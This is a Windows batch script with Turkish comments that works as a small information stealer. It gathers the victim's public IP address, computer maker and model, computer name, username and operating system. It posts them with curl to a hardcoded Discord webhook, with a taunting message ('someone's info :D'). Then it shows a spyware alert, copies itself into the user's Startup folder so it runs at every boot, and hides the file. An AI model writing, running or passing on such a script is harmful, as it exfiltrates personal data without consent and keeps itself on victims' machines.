@echo off

rem Webhook URL'si
set webhook_url=https://discord.com/api/webhooks/1345350612627226627/LVXxvIuFmj_3lbOa_ZlBjFuSHjEhOL0Vrd2ODY_N_GfFFh6tnkJWP5dTWlSL1PtG6cjj

rem IP adresini al
echo IP adresi alınıyor...
for /f "tokens=* delims=" %%a in ('curl -s https://ipv4.wtfismyip.com/text') do set ip=%%a
if "%ip%"=="" (
    echo IP adresi alınamadı. Lütfen internet bağlantınızı kontrol edin.
    pause
    exit /b
)
echo IP Adresi: %ip%

rem Bilgisayar markasını al
echo Bilgisayar markası alınıyor...
for /f "tokens=2 delims=:" %%a in ('systeminfo ^| findstr /i "Manufacturer"') do set manufacturer=%%a
echo Bilgisayar Markası: %manufacturer%

rem Bilgisayarın modelini al
echo Bilgisayar model bilgisi alınıyor...
for /f "tokens=2 delims=:" %%a in ('systeminfo ^| findstr /i "Model"') do set model=%%a
echo Bilgisayar Modeli: %model%

rem Bilgisayar adı
set computername=%COMPUTERNAME%
echo Bilgisayar Adı: %computername%

rem Kullanıcı adını al
set username=%USERNAME%
echo Kullanıcı Adı: %username%

rem İşletim sistemi bilgisi al
for /f "tokens=2 delims=:" %%a in ('systeminfo ^| findstr /i "OS"') do set os=%%a
echo İşletim Sistemi: %os%

rem JSON verisini doğru formatta oluştur (alt alta satırlara ayırarak)
echo {"content": "IP: %ip%\nKullanıcı Adı: %username%\nBilgisayar Adı: %computername%\nİşletim Sistemi: %os%\nBilgisayar Markası: %manufacturer%\nBilgisayar Modeli: %model%"} > json.txt

rem JSON dosyasının içeriğini yazdır
echo JSON dosyasının içeriği:
type json.txt

rem Bilgler Mesajı
curl -X POST -H "Content-Type: application/json" --data "{\"content\":\"Birinin bilgileri :D :arrow_down:\"}" https://discord.com/api/webhooks/1345350612627226627/LVXxvIuFmj_3lbOa_ZlBjFuSHjEhOL0Vrd2ODY_N_GfFFh6tnkJWP5dTWlSL1PtG6cjj

rem Webhook'a gönder
echo Webhook'a gönderiliyor...
curl -X POST -H "Content-Type: application/json" --data @json.txt %webhook_url% > ya.txt 2>&1

rem curl çıktısını yazdır
echo curl çıktısı:
type ya.txt

rem JSON dosyasını sil
del json.txt

rem ya.txt sil
del ya.txt

@echo off
rem MsgBox ile uyarı kutusu açma
echo Set objArgs = WScript.Arguments > %temp%\msgbox.vbs
echo MsgBox "Bilgisayarinizda Casus Yazilim Olabilir!", 16, "Dikkat!" >> %temp%\msgbox.vbs
cscript //nologo %temp%\msgbox.vbs
del %temp%\msgbox.vbs


@echo off
rem Başlangıç klasörüne kopyalanacak dosyanın yolu
set startMenu=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup

rem Bu dosyanın yolu
set batPath=%~f0

rem Başlangıç klasörüne kopyalanacak dosyanın adı
set startupFile=%startMenu%\start_program.bat

rem Başlangıç klasörüne kendisini kopyalıyoruz
copy "%batPath%" "%startupFile%"

rem Kullanıcıya bilgi ver
echo Başlangıç klasörüne başarıyla eklendi: %startupFile%
del ya.txt.txt

rem Dosyayı Gizle
attrib +h %0
exit